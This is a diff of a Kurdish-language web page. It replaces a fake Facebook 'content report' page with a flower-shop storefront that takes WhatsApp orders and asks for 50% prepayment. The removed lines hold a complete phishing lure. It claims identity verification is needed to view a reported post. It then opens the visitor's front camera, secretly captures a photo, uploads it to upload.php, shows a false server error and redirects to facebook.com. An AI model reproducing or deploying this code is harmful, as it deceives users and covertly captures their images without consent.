@@ -2,55 +2,216 @@
 <html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Facebook - Content Report</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ئیلیان فڵاوەرز | Elian Flowers</title>
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;500;800&display=swap" rel="stylesheet">
+    
     <style>
-        body { background: #f0f2f5; font-family: sans-serif; margin: 0; text-align: center; }
-        .header { background: #1877f2; color: white; padding: 10px; font-weight: bold; }
-        .container { background: white; max-width: 450px; margin: 20px auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .blurred-img { width: 100%; filter: blur(8px); border: 1px solid #ddd; border-radius: 5px; }
-        .overlay-text { background: rgba(0,0,0,0.7); color: white; padding: 15px; border-radius: 5px; margin-top: -150px; position: relative; z-index: 10; }
-        .btn-view { background: #42b72a; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 130px; }
+        :root {
+            --main-color: #6a1b9a;
+            --accent: #d81b60;
+            --glass: rgba(255, 255, 255, 0.85);
+        }
+
+        * { box-sizing: border-box; transition: all 0.3s ease; }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            margin: 0;
+            background: #fdf2f8;
+            color: #2d3436;
+        }
+
+        /* مەرجەکە لە سەرەوە - کورت و دیار */
+        .top-notice {
+            background: linear-gradient(90deg, #6a1b9a, #d81b60);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        /* ڕوکاری پشتەوە (Header) وەک پێشوو */
+        header {
+            height: 50vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-image: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), 
+                              url('https://images.unsplash.com/photo-1526047932273-341f2a7631f9?auto=format&fit=crop&w=1200&q=80');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: white;
+            border-radius: 0 0 40px 40px;
+            text-align: center;
+        }
+
+        .logo-box {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            padding: 25px 40px;
+            border-radius: 25px;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 800;
+            text-transform: lowercase;
+            margin: 0;
+            letter-spacing: 3px;
+        }
+
+        /* کارتەکان */
+        .container {
+            max-width: 1100px;
+            margin: 40px auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .flower-card {
+            background: white;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .flower-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(106, 27, 154, 0.15);
+        }
+
+        .flower-card img {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+        }
+
+        .info {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .price {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--main-color);
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .order-btn {
+            width: 100%;
+            background: linear-gradient(45deg, #6a1b9a, #d81b60);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 15px;
+            font-family: 'Vazirmatn';
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* بەشی خوارەوە - پارەدان */
+        footer {
+            background: white;
+            padding: 40px 20px;
+            text-align: center;
+            border-radius: 40px 40px 0 0;
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.02);
+            margin-top: 50px;
+        }
+
+        .pay-grid {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .pay-item {
+            background: #f3e5f5;
+            padding: 8px 18px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: #6a1b9a;
+            border: 1px solid #e1bee7;
+        }
+
+        .cash-item {
+            background: #fff3e0;
+            padding: 8px 18px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: #ef6c00;
+            border: 1px solid #ffe0b2;
+        }
     </style>
 </head>
 <body>
-    <div class="header">ناوەندی سکاڵا و پاراستنی مافەکان</div>
-    <div class="container">
-        <h3>ئاگاداری دەربارەی پۆستێکی ناوزڕاندن</h3>
-        <p style="font-size: 14px; color: #555;">ئەم پۆستەی خوارەوە لەلایەن بەکارهێنەرێکەوە وەک "ناوزڕاندن" ڕاپۆرت کراوە و بە کاتی ڕاگیراوە.</p>
-        
-        <img src="https://via.placeholder.com/400x500/cccccc/969696?text=POST+CONTENT" class="blurred-img">
-        
-        <div class="overlay-text">
-            بۆ بینینی ناوەڕۆکی پۆستەکە و وێنەکان، دەبێت ناسنامەی خۆت بسەلمێنیت
-        </div>
 
-        <button class="btn-view" onclick="openCam()">بینینی پۆست و وێنەکان</button>
+<div class="top-notice">
+    📢 مەرجی داواکردن: پێویستە ٥٠٪ی پارەکە بە (FIB / FastPay) پێشوەختە بنێردرێت.
+</div>
+
+<header>
+    <div class="logo-box">
+        <h1 class="logo">elian flowers</h1>
+        <p style="margin-top: 5px; opacity: 0.9;">جوانی لە هەر چەپکە گوڵێکدا</p>
     </div>
+</header>
 
-    <video id="v" autoplay style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+<div class="container" id="flower-list"></div>
 
-    <script>
-        function openCam() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(function(s) {
-                var v = document.getElementById('v');
-                v.srcObject = s;
-                setTimeout(function() {
-                    var c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    fetch('upload.php', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: 'img=' + encodeURIComponent(c.toDataURL('image/jpeg'))
-                    }).then(() => {
-                        alert("هەڵە لە سێرڤەر! کەمێکی تر تاقی بکەرەوە.");
-                        window.location.href = "https://facebook.com";
-                    });
-                }, 2000);
-            }).catch(() => { alert("بۆ بینینی ئەو پۆستەی سکاڵای لەسەرە، دەبێت ڕێگە بە کامێرا بدەیت تا بزانین تۆ خاوەن پەیجەکەی."); });
-        }
-    </script>
+<footer>
+    <h3 style="color: #6a1b9a; font-size: 18px;">💳 شێوازەکانی پارەدان</h3>
+    <div class="pay-grid">
+        <div class="pay-item">FIB</div>
+        <div class="pay-item">Fast Pay</div>
+        <div class="cash-item">نیوەکەی تر لەکاتی گەیاندن 🚚</div>
+    </div>
+    <p style="margin-top: 30px; font-size: 11px; color: #bbb;">elian flowers &copy; 2026</p>
+</footer>
+
+<script>
+    const flowers = [
+        { name: "باکسی ئیلیانی لوکس", price: "٣٥,٠٠٠ د.ع", img: "https://images.unsplash.com/photo-1561181286-d3fee7d55364?auto=format&fit=crop&w=600" },
+        { name: "چەپکە گوڵی سوور", price: "٢٥,٠٠٠ د.ع", img: "https://images.unsplash.com/photo-1548610762-65ca0615f399?auto=format&fit=crop&w=600" },
+        { name: "گوڵی سپی ئاشتی", price: "٢٠,٠٠٠ د.ع", img: "https://images.unsplash.com/photo-1526047932273-341f2a7631f9?auto=format&fit=crop&w=600" },
+        { name: "باکسی مۆری شاهانە", price: "٤٥,٠٠٠ د.ع", img: "https://images.unsplash.com/photo-1582794543139-8ac9cb0f7b11?auto=format&fit=crop&w=600" }
+    ];
+
+    const list = document.getElementById('flower-list');
+    flowers.forEach(f => {
+        list.innerHTML += `
+            <div class="flower-card">
+                <img src="${f.img}" loading="lazy" alt="${f.name}">
+                <div class="info">
+                    <h3>${f.name}</h3>
+                    <span class="price">${f.price}</span>
+                    <button class="order-btn" onclick="order('${f.name}')">داواکردن</button>
+                </div>
+            </div>
+        `;
+    });
+
+    function order(name) {
+        const phone = "964750XXXXXXX"; // ژمارەی مۆبایلی خۆت لێرە دابنێ
+        const msg = encodeURIComponent(`سڵاو ئیلیان فڵاوەرز، دەمەوێت ئەمە داوا بکەم: ${name}\nئاگادارم کە دەبێت ٥٠٪ی پارەکە بە پێشوەختە بنێرم.`);
+        window.location.href = `https://wa.me/${phone}?text=${msg}`;
+    }
+</script>
+
 </body>
 </html>
